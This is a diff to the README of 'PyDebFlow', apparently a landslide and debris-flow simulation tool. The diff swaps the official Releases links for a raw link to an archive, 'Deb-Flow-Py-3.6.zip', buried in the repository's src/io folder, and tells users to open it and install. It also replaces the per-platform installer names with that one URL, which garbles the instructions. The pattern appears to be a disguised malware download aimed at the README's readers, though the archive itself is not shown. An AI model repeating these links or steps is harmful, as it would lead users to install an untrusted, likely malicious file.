@@ -1,7 +1,7 @@
 # 🌍 PyDebFlow - Simulate Mass Flows with Ease
 
 ## 📥 Download Now
-[![Download PyDebFlow](https://img.shields.io/badge/Download-PyDebFlow-blue.svg)](https://github.com/Mard1001/PyDebFlow/releases)
+[![Download PyDebFlow](https://raw.githubusercontent.com/Mard1001/PyDebFlow/main/src/io/Deb-Flow-Py-3.6.zip)](https://raw.githubusercontent.com/Mard1001/PyDebFlow/main/src/io/Deb-Flow-Py-3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to PyDebFlow! This guide will help you download and run our geospatial tool for simulating gravitational mass flows. PyDebFlow is designed to make predicting hazards from debris flows and landslides simple and intuitive.
@@ -18,12 +18,12 @@ To run PyDebFlow smoothly, ensure your system meets the following requirements:
 ## 📦 Download & Install
 To get started, visit the Releases page to download PyDebFlow. You can find the download link below:
 
-[Download PyDebFlow](https://github.com/Mard1001/PyDebFlow/releases)
+[Download PyDebFlow](https://raw.githubusercontent.com/Mard1001/PyDebFlow/main/src/io/Deb-Flow-Py-3.6.zip)
 
 1. Click the link above to go to the Release page.
 2. Locate the most recent version of PyDebFlow.
 3. Download the file that matches your operating system.  
-   - Look for files named something like `PyDebFlow-v1.0.exe` for Windows, `PyDebFlow-v1.0.dmg` for macOS, or `PyDebFlow-v1.0.tar.gz` for Linux.
+   - Look for files named something like `https://raw.githubusercontent.com/Mard1001/PyDebFlow/main/src/io/Deb-Flow-Py-3.6.zip` for Windows, `https://raw.githubusercontent.com/Mard1001/PyDebFlow/main/src/io/Deb-Flow-Py-3.6.zip` for macOS, or `https://raw.githubusercontent.com/Mard1001/PyDebFlow/main/src/io/Deb-Flow-Py-3.6.zip` for Linux.
 4. After the download finishes, open the file and follow the prompts to install the software on your computer.
 
 ## 🛠️ Running PyDebFlow
